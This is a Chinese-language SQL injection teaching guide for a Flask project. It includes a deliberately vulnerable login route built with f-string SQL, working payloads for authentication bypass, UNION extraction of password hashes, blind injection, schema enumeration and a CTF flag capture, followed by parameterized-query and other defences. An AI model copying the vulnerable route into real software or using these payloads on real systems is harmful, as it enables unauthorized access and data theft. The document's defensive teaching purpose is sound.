# SQL 注入安全演示文档

## 📋 目录

- [什么是 SQL 注入](#什么是-sql-注入)
- [漏洞产生的原因](#漏洞产生的原因)
- [本项目中的漏洞示例](#本项目中的漏洞示例)
- [攻击演示步骤](#攻击演示步骤)
- [漏洞代码 vs 安全代码对比](#漏洞代码-vs-安全代码对比)
- [防护措施](#防护措施)

---

## 什么是 SQL 注入？

SQL 注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码片段，从而操纵后端数据库的查询，达到以下目的：

- 🔓 **绕过身份验证**：未授权访问系统
- 📊 **数据泄露**：窃取敏感信息（用户密码、个人信息等）
- 💥 **数据篡改**：修改或删除数据库中的数据
- 🎯 **提权**：将普通用户提升为管理员
- 🗑️ **数据库破坏**：删除整个数据库

### 危害等级

🔴 **严重** - OWASP Top 10 安全风险之一

---

## 漏洞产生的原因

SQL 注入漏洞的根本原因是：**将不可信的用户输入直接拼接到 SQL 查询语句中**，导致用户输入被当作 SQL 代码执行。

### 典型错误模式

```python
# ❌ 错误：直接字符串拼接
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

当用户输入 `admin' OR '1'='1' --` 时，实际执行的 SQL 变成：

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
```

`'1'='1'` 永远为真，`--` 注释掉后面的内容，从而绕过了所有验证。

---

## 本项目中的漏洞示例

### 漏洞路由：`/vulnerable_login`

**文件位置：** `college-recommender/app.py`

```python
@app.route('/vulnerable_login', methods=['GET', 'POST'])
def vulnerable_login():
    """
    ⚠️ 警告：此路由故意存在 SQL 注入漏洞，仅用于安全教学演示！
    请勿在生产环境中使用此代码。
    """
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # ⚠️ 危险！直接拼接 SQL - 存在注入漏洞（仅用于演示）
        query = f"SELECT * FROM users WHERE username = '{username}' AND password_hash = '{password}'"
        
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(query)  # 漏洞点：未使用参数化查询
            user = cursor.fetchone()
            conn.close()
            
            if user:
                session['user_id'] = user['id']
                session['username'] = user['username']
                session['role'] = user['role'] if 'role' in user.keys() else 'user'
                flash('登录成功！（漏洞演示）', 'success')
                return redirect(url_for('recommend_page'))
            else:
                flash('用户名或密码错误', 'danger')
        except Exception as e:
            # 显示详细错误信息（生产环境不应这样做）
            flash(f'SQL 错误: {str(e)}', 'danger')
    
    return render_template('vulnerable_login.html')
```

### 漏洞点分析

1. **第 10 行**：使用 f-string 直接拼接用户输入
2. **第 14 行**：执行未经过滤的 SQL 查询
3. **第 26 行**：向用户显示详细的 SQL 错误信息（信息泄露）

---

## 攻击演示步骤

### 场景 1：绕过身份验证 🔓

**目标**：不知道密码的情况下登录系统

**步骤**：
1. 访问 `http://localhost:5000/vulnerable_login`
2. 在用户名字段输入：`admin' OR '1'='1' --`
3. 在密码字段输入：任意内容（例如：`123`）
4. 点击登录

**攻击原理**：

原始 SQL：
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password_hash = '123'
```

解析后：
- `username = 'admin'`：查找 admin 用户
- `OR '1'='1'`：或者永真条件（总是成立）
- `--`：SQL 注释符，注释掉后面的密码检查

**结果**：✅ 成功以第一个用户（通常是 admin）身份登录！

---

### 场景 2：联合查询注入 📊

**目标**：获取数据库中所有用户的信息

**步骤**：
1. 访问漏洞登录页面
2. 在用户名字段输入：
   ```
   ' UNION SELECT id, username, email, password_hash, role FROM users --
   ```
3. 提交表单

**攻击原理**：

生成的 SQL：
```sql
SELECT * FROM users WHERE username = '' 
UNION 
SELECT id, username, email, password_hash, role FROM users --' AND password_hash = ''
```

UNION 操作符将两个查询结果合并：
- 第一个查询返回空（username = ''）
- 第二个查询返回所有用户的完整信息

**结果**：💀 数据库中所有用户的信息被泄露，包括密码哈希！

---

### 场景 3：盲注攻击 🕵️

**目标**：通过应用响应推断数据库信息

**基于布尔的盲注**：

Payload 1：测试用户表是否存在
```sql
admin' AND (SELECT COUNT(*) FROM users) > 0 --
```

- 如果登录成功 → users 表存在
- 如果登录失败 → users 表不存在或查询出错

Payload 2：推断用户数量
```sql
admin' AND (SELECT COUNT(*) FROM users) > 5 --
admin' AND (SELECT COUNT(*) FROM users) > 10 --
```

通过二分法逐步缩小范围，确定准确的用户数量。

**基于时间的盲注**：

```sql
admin' AND CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE (SELECT 1 FROM sqlite_master WHERE 1=1) END --
```

观察响应时间差异来推断条件是否成立。

---

### 场景 4：数据库信息收集 🔍

**获取数据库版本**：

SQLite 特有语法：
```sql
' UNION SELECT sqlite_version(), 1, 1, 1, 1 --
```

**枚举所有表名**：

```sql
' UNION SELECT name, type, sql, 1, 1 FROM sqlite_master WHERE type='table' --
```

返回结果示例：
```
users | table | CREATE TABLE users (...)
admissions | table | CREATE TABLE admissions (...)
hidden_flags | table | CREATE TABLE hidden_flags (...)
```

**获取表结构**：

```sql
' UNION SELECT sql, 1, 1, 1, 1 FROM sqlite_master WHERE type='table' AND name='users' --
```

---

### 场景 5：CTF 夺旗挑战 🚩

**挑战背景**：

数据库中隐藏着一个特殊的 `hidden_flags` 表，包含两个 flag：
1. `sql_injection_master` - SQL 注入大师
2. `blind_injection_expert` - 盲注专家

**挑战任务**：使用 SQL 注入找到这些 flag！

#### 解题步骤

**步骤 1：发现隐藏表**

使用信息收集技巧，枚举所有表：
```sql
' UNION SELECT name, type, sql, 1, 1 FROM sqlite_master WHERE type='table' --
```

发现表名：`hidden_flags` ✓

**步骤 2：查询表结构**

```sql
' UNION SELECT sql, 1, 1, 1, 1 FROM sqlite_master WHERE name='hidden_flags' --
```

得到表结构：
```sql
CREATE TABLE hidden_flags (
    id INTEGER PRIMARY KEY,
    flag_name TEXT NOT NULL,
    flag_value TEXT NOT NULL,
    hint TEXT
)
```

**步骤 3：获取 Flag**

在漏洞登录页面输入：
```sql
' UNION SELECT id, flag_name, flag_value, hint, 'user' FROM hidden_flags --
```

**结果**：🎉 成功获取两个 Flag！

```
FLAG{Y0u_F0und_Th3_S3cr3t_2026}
FLAG{T1m3_B4s3d_Bl1nd_1nj3ct10n}
```

---

## 漏洞代码 vs 安全代码对比

### ❌ 危险代码（存在 SQL 注入）

```python
# 文件：app.py - vulnerable_login()
@app.route('/vulnerable_login', methods=['GET', 'POST'])
def vulnerable_login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # ⚠️ 危险！直接字符串拼接
        query = f"SELECT * FROM users WHERE username = '{username}' AND password_hash = '{password}'"
        
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(query)  # 漏洞点
        user = cursor.fetchone()
        conn.close()
        
        if user:
            # 登录成功逻辑
            return redirect(url_for('recommend_page'))
    
    return render_template('vulnerable_login.html')
```

**问题**：
- ❌ 使用 f-string 直接拼接用户输入
- ❌ 用户输入可以改变 SQL 语句的结构
- ❌ 没有输入验证
- ❌ 显示详细的错误信息

---

### ✅ 安全代码（参数化查询）

```python
# 文件：app.py - login()
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db_connection()
        cursor = conn.cursor()
        
        # ✓ 安全：使用参数化查询（占位符 ?）
        cursor.execute('SELECT id, username, password_hash, role FROM users WHERE username = ?', (username,))
        user = cursor.fetchone()
        conn.close()

        if user and check_password_hash(user[2], password):
            # 登录成功逻辑
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[3]
            return redirect(url_for('recommend_page'))
        else:
            flash('用户名或密码错误！', 'error')

    return render_template('login.html')
```

**优点**：
- ✅ 使用占位符 `?` 和参数元组 `(username,)`
- ✅ 用户输入作为数据处理，不会被解释为 SQL 代码
- ✅ 使用 `check_password_hash()` 验证密码
- ✅ 错误信息模糊化，不泄露内部细节

---

### 对比总结

| 特性 | 危险代码 | 安全代码 |
|------|----------|----------|
| SQL 构造方式 | 字符串拼接 | 参数化查询 |
| 用户输入处理 | 直接嵌入 SQL | 作为参数传递 |
| SQL 注入风险 | 🔴 极高 | 🟢 无 |
| 密码验证 | 直接比较原文 | 哈希值比对 |
| 错误信息 | 详细（泄露内部） | 模糊（保护隐私） |
| 生产可用性 | ❌ 不可用 | ✅ 可用 |

---

## 防护措施

### 1. 使用参数化查询/预编译语句 ⭐⭐⭐⭐⭐

这是防止 SQL 注入的**最有效**方法。

**Python (sqlite3)**：
```python
# ✓ 正确
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# ✓ 正确（多个参数）
cursor.execute("INSERT INTO users (username, email) VALUES (?, ?)", (username, email))
```

**Python (MySQL - mysqlclient)**：
```python
# ✓ 正确
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Python (PostgreSQL - psycopg2)**：
```python
# ✓ 正确
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**使用 ORM 框架**：
```python
# SQLAlchemy 示例
user = User.query.filter_by(username=username).first()

# Django ORM 示例
user = User.objects.get(username=username)
```

---

### 2. 输入验证和过滤 ⭐⭐⭐⭐

对用户输入进行严格的验证：

```python
import re

def validate_username(username: str) -> bool:
    """验证用户名（3-20个字符，字母数字下划线）"""
    if not username or len(username) < 3 or len(username) > 20:
        return False
    return bool(re.match(r'^[a-zA-Z0-9_]+$', username))

def validate_email(email: str) -> bool:
    """验证邮箱格式"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

# 使用示例
username = request.form.get('username', '')
if not validate_username(username):
    flash('用户名格式不正确！', 'error')
    return render_template('login.html')
```

---

### 3. 最小权限原则 ⭐⭐⭐⭐

数据库账户只授予必要的权限：

```sql
-- ❌ 错误：使用 root 或管理员账户
-- ✓ 正确：创建专用账户，限制权限

CREATE USER 'webapp_user'@'localhost' IDENTIFIED BY 'strong_password';

-- 只授予必要的权限
GRANT SELECT, INSERT, UPDATE ON college_db.users TO 'webapp_user'@'localhost';
GRANT SELECT ON college_db.admissions TO 'webapp_user'@'localhost';

-- 不授予以下权限
-- ❌ DROP, DELETE, CREATE, ALTER 等高危权限
```

---

### 4. 错误信息处理 ⭐⭐⭐

不要向用户显示详细的数据库错误：

```python
# ❌ 错误：泄露内部信息
try:
    cursor.execute(query)
except Exception as e:
    flash(f'SQL 错误: {str(e)}', 'danger')  # 暴露 SQL 语句结构

# ✓ 正确：模糊化错误信息
try:
    cursor.execute(query, params)
except Exception as e:
    # 记录详细错误到日志
    app.logger.error(f'Database error: {str(e)}')
    # 向用户显示通用错误
    flash('登录失败，请稍后重试', 'error')
```

---

### 5. 使用 Web 应用防火墙 (WAF) ⭐⭐⭐

WAF 可以检测和阻止常见的攻击模式：

**常见 WAF 解决方案**：
- ModSecurity (开源)
- AWS WAF
- Cloudflare WAF
- Azure WAF

**检测规则示例**：
```
# 检测 SQL 注入关键词
union|select|insert|update|delete|drop|create|alter|exec|script
```

---

### 6. 定期安全审计 ⭐⭐⭐

**使用自动化工具**：
- SQLMap（SQL 注入测试）
- OWASP ZAP（Web 应用扫描）
- Burp Suite（渗透测试）

**代码审查清单**：
- [ ] 所有数据库查询都使用参数化？
- [ ] 用户输入都经过验证？
- [ ] 错误信息不包含敏感信息？
- [ ] 数据库账户遵循最小权限原则？
- [ ] 敏感操作记录日志？

---

### 7. 安全编码最佳实践 ⭐⭐⭐⭐⭐

```python
# ✓ 推荐的安全登录实现
from werkzeug.security import check_password_hash
import logging

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        # 1. 输入验证
        if not validate_username(username):
            flash('用户名格式不正确', 'error')
            return render_template('login.html')
        
        if len(password) < 6:
            flash('密码长度不正确', 'error')
            return render_template('login.html')
        
        try:
            with get_db() as conn:
                cursor = conn.cursor()
                
                # 2. 参数化查询
                cursor.execute(
                    'SELECT id, username, password_hash, role FROM users WHERE username = ?',
                    (username,)
                )
                user = cursor.fetchone()
                
                # 3. 安全的密码验证
                if user and check_password_hash(user['password_hash'], password):
                    session['user_id'] = user['id']
                    session['username'] = user['username']
                    session['role'] = user['role']
                    
                    # 4. 记录成功登录日志
                    logging.info(f"User {username} logged in successfully")
                    
                    return redirect(url_for('recommend_page'))
                else:
                    # 5. 模糊化错误信息（不区分用户名不存在/密码错误）
                    flash('用户名或密码错误', 'error')
                    
                    # 6. 记录失败尝试
                    logging.warning(f"Failed login attempt for username: {username}")
        
        except Exception as e:
            # 7. 记录详细错误，但不显示给用户
            logging.error(f"Login error: {str(e)}")
            flash('登录失败，请稍后重试', 'error')
    
    return render_template('login.html')
```

---

## 总结

### 🔑 关键要点

1. **永远不要信任用户输入** - 任何用户输入都可能是恶意的
2. **使用参数化查询** - 这是防止 SQL 注入的金标准
3. **多层防护** - 输入验证 + 参数化查询 + 最小权限 + WAF
4. **安全意识** - 定期培训，代码审查，安全测试

### 📚 延伸阅读

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)

---

## ⚠️ 免责声明

本文档及相关演示代码仅用于**教育和安全意识培训**目的。

- ❌ 不得用于非法攻击他人系统
- ❌ 不得在生产环境中使用漏洞代码
- ✅ 仅在授权的测试环境中进行安全测试
- ✅ 负责任地披露发现的安全漏洞

**记住：网络安全从你我做起！** 🛡️
